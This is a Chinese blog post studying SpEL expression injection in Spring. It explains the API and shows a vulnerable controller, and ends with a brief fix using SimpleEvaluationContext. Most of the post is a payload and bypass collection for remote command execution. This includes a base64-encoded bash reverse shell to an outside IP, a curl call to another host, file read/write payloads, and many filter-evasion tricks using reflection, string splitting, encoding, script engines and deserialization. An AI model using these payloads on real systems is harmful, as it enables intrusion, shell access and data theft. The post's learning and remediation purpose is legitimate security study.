# 前言

之前在D3CTF中遇到了一次关于EL表达式注入的题目，但是没有仔细去学过这个东西，直到最近Spring Cloud Gateway爆出来是通过Spel表达式注入的，终于想起来学一学Spel表达式了

# 什么是Spel表达式

Spring Expression Language（简称 SpEL）是一种功能强大的表达式语言、用于在运行时查询和操作对象图；语法上类似于 Unified EL，但提供了更多的特性，特别是方法调用和基本字符串模板函数。SpEL 的诞生是为了给 Spring 社区提供一种能够与 Spring 生态系统所有产品无缝对接，能提供一站式支持的表达式语言

**基本表达式**

字面量表达式、关系，逻辑与算数运算表达式、字符串链接及截取表达式、三目运算、正则表达式以及括号优先级表达式；

**类相关表达式**

类类型表达式、类实例化、instanceof 表达式、变量定义及引用、赋值表达式、自定义函数、对象属性存取及安全导航表达式、对象方法调用、Bean 引用；

**集合相关表达式**

内联 List、内联数组、集合、字典访问、列表、字典；

**其他表达式**

模版表达式

## SpelAPI

Spel主要代码

```
public String spel(String input){
    SpelExpressionParser parser = new SpelExpressionParser();
    Expression expression = parser.parseExpression(input);
    return expression.getValue().toString();
}
```

1.创建解析器：SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现

2.解析表达式：使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象

3.求值：通过 Expression 接口的 getValue 方法根据上下文获得表达式值

## Spel语法

SpEL使用 `#{...}` 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法如：

> 引用其他对象:`#{car}`
> 引用其他对象的属性：`#{car.brand}`
> 调用其它方法 , 还可以链式操作：`#{car.toString()}`

其中属性名称引用还可以用`$`符号 如：`${someProperty}`
除此以外在SpEL中，使用`T()`运算符会调用类作用域的方法和常量。例如，在SpEL中使用Java的`Math`类，我们可以像下面的示例这样使用`T()`运算符：

`#{T(java.lang.Math)}`

`T()`运算符的结果会返回一个`java.lang.Math`类对象

看到这里，就有点感觉了，根据上面所说的，他会解析里面的东西，又可以返回一个对象，调用相应的方法，那就可能会存在一定的安全问题

那可能就可以这样`T(java.lang.Runtime).getRuntime().exec("calc")`达到一个命令执行的效果了

其他通过XML文档和注解的时候平常在攻击的不会怎么用到

# Spel实践

```
@ResponseBody
@RequestMapping("/Spel")
public String spel(String input){
    SpelExpressionParser parser = new SpelExpressionParser();
    Expression expression = parser.parseExpression(input);
    return expression.getValue().toString();
}
```

![image-20220406155037625](images/1.png)

可以看到返回了计算结果的值，那就存在一个注入

但是这里注意一下，如果是用tomcat起的服务的话，由于tomcat对GET请求中的`| {}` 等特殊字符存在限制(RFC 3986)，所以需要使用POST方法传递参数

先来试试直接执行一个exec命令

![image-20220406155254969](images/2.png)

除此之外也可以直接new一个类名调用其方法,要写全类名

**使用"T(Type)"来表示 java.lang.Class 实例，"Type"必须是类全限定名，"java.lang"包除外，即该包下的类可以不指定包名；使用类类型表达式还可以进行访问类静态方法及类静态字段**

`input=new java.lang.ProcessBuilder("calc").start()`

之前在学命令执行的时候也分析到了可以直接调用ProcessBuilder的start方法来命令执行

![image-20220406155455892](images/3.png)



# 关于Spel注入回显

在CTF中，有时候会有不出网的问题，这个时候执行的命令又没有回显应该怎么办呢

- 使用commons-io这个组件实现回显，这种方式会受限于目标服务器是否存在这个组件，springboot默认环境下都没有用到这个组件。。

```scss
T(org.apache.commons.io.IOUtils).toString(payload).getInputStream())
```

- 使用jdk>=9中的JShell，这种方式会受限于jdk的版本问题

```scss
T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('whatever java code in one statement').toString()
```

- 使用JDK原生类BufferedReader构造回显

```
new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "gbk")).readLine()
```

![image-20220406160628264](images/4.png)

但是呢这个有一个缺点，就是只能输出一行数据

![image-20220406160642766](images/5.png)

- 利用原生类Scanner

```
new java.util.Scanner(new java.lang.ProcessBuilder("cmd", "/c", "dir", ".\\").start().getInputStream(), "GBK").useDelimiter("asfsfsdfsf").next()
```

![image-20220406160800012](images/6.png)

# 记录payload及一些绕过

## payload

- 反弹shell，这在D3CTF中遇到过一次

```
${@jdk.jshell.JShell@create().eval('java.lang.Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45My4yNDguMjIxLzIzMzMgMD4mMQ==}|{base64,-d}|{bash,-i}");')}
```

- 原生类回显

```
new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "gbk")).readLine()
```

```
new java.util.Scanner(new java.lang.ProcessBuilder("cmd", "/c", "dir", ".\\").start().getInputStream(), "GBK").useDelimiter("asfsfsdfsf").next()
```

- **nio 读文件**

```lisp
new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get(T(java.net.URI).create("file:/C:/Users/helloworld/1.txt"))))
```

- **nio 写文件**

```lua
T(java.nio.file.Files).write(T(java.nio.file.Paths).get(T(java.net.URI).create("file:/C:/Users/helloworld/1.txt")), '123464987984949'.getBytes(), T(java.nio.file.StandardOpenOption).WRITE)
```

## Bypass

### 反射调用

```
T(String).getClass().forName("java.lang.Runtime").getRuntime().exec("calc")

// 同上，需要有上下文环境
#this.getClass().forName("java.lang.Runtime").getRuntime().exec("calc")

// 反射调用+字符串拼接，绕过正则过滤
T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})

// 同上，需要有上下文环境
#this.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})

#{T(String).getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('ex'+'ec',T(String[])).invoke(T(String).getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('getRu'+'ntime').invoke(T(String).getClass().forName('java.la'+'ng.Ru'+'ntime')), new String[]{'/bin/bash','-c','curl 192.168.127.129:2345'})}
```

## 绕过getClass(过滤

```csharp
''.getClass 替换为 ''.class.getSuperclass().class
''.class.getSuperclass().class.forName('java.lang.Runtime').getDeclaredMethods()[14].invoke(''.class.getSuperclass().class.forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'calc')
```

需要注意，这里的14可能需要替换为15，不同jdk版本的序号不同

## url编码绕过

```scss
// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符
// byte数组内容的生成后面有脚本
new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()
// char转字符串，再字符串concat
T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))
```

## JavaScript引擎

```scss
T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")

T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval("xxx"),)
```

## JavaScript+反射

```javascript
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})),)
```

## JavaScript+URL编码

```perl
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(java.net.URLDecoder).decode("%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29")),)
```

## Jshell

```scss
T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('whatever java code in one statement').toString()
```

接下来这三个都具体使用可以在https://landgrey.me/blog/15/看到

## 绕过T( 过滤

```perl
T%00(new)
这涉及到SpEL对字符的编码，%00会被直接替换为空
```

## 使用Spring工具类反序列化，绕过new关键字

```scss
T(org.springframework.util.SerializationUtils).deserialize(T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('rO0AB...'))
// 可以结合CC链食用
```

## 使用Spring工具类执行自定义类的静态代码块

```scss
T(org.springframework.cglib.core.ReflectUtils).defineClass('Singleton',T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('yv66vgAAADIAtQ....'),T(org.springframework.util.ClassUtils).getDefaultClassLoader())
```

需要在自定义类写静态代码块 `static{}`

# 关于漏洞修复

在挺多存在Spel注入漏洞的补丁中，经常会看到一个SimpleEvaluationContext类

spEL表达式是可以操作类和方法的，可以通过类型表达式T(Type)来调用任意类方法，这是因为在不指定`EvaluationContext`的情况下默认采用`StandardEvaluationContext`，而它包含了spEL的所有功能，在允许用户控制输入的情况下可以造成任意命令执行

最直接的防御方法就是使用`SimpleEvaluationContext`替换`StandardEvaluationContext`

- SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。
- StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。

SimpleEvaluationContext旨在仅支持SpEL语言语法的一个子集，不包括 Java类型引用、构造函数和bean引用；而StandardEvaluationContext是支持全部SpEL语法的

SimpleEvaluationContext 旨在仅支持 SpEL 语言语法的一个子集。它不包括 Java 类型引用，构造函数和 bean 引用；所以最直接的修复方式是使用 SimpleEvaluationContext 替换 StandardEvaluationContext

# 后记

这篇文章浅显的了解一下Spel表达式注入的主要API，然后记录一下payload和bypass，基本上是抄录的https://www.cnblogs.com/bitterz/p/15206255.html文章，不算自己的文章，只是在里面加上了一点自己的实践

主要目的只是进行一个学习，然后为分析Spring Cloud Gateway的Spel做一个知识储备





参考链接

https://www.cnblogs.com/bitterz/p/15206255.html

https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/

http://rui0.cn/archives/1043

https://www.jianshu.com/p/3c0e56aa2072



